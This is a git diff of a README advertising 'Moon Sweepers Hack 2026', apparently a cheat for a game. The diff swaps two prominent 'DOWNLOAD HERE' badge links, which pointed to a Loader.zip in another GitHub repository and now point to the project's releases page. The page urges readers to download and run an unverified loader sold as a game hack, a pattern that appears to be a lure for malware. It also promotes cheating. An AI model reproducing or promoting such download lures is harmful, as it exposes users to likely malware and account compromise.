@@ -40,7 +40,7 @@ But Moon Sweepers is **brutal**. The **dust grind** is endless. The **tool upgra
 
 ## 🔗 Download
 
-[![Download Moon Sweepers Hack 2026](https://img.shields.io/badge/DOWNLOAD-HERE-00CED1?style=for-the-badge&logo=download&logoColor=white)](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
+[![Download Moon Sweepers Hack 2026](https://img.shields.io/badge/DOWNLOAD-HERE-00CED1?style=for-the-badge&logo=download&logoColor=white)](../../releases)
 
 ---
 
@@ -193,7 +193,7 @@ The cheat ships with a full-featured config system — every setting can be save
 
 ## 📥 Download Moon Sweepers Hack 2026
 
-[![Download Now](https://img.shields.io/badge/DOWNLOAD-HERE-00CED1?style=for-the-badge&logo=download&logoColor=white)](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
+[![Download Now](https://img.shields.io/badge/DOWNLOAD-HERE-00CED1?style=for-the-badge&logo=download&logoColor=white)](../../releases)
 
 ---
 
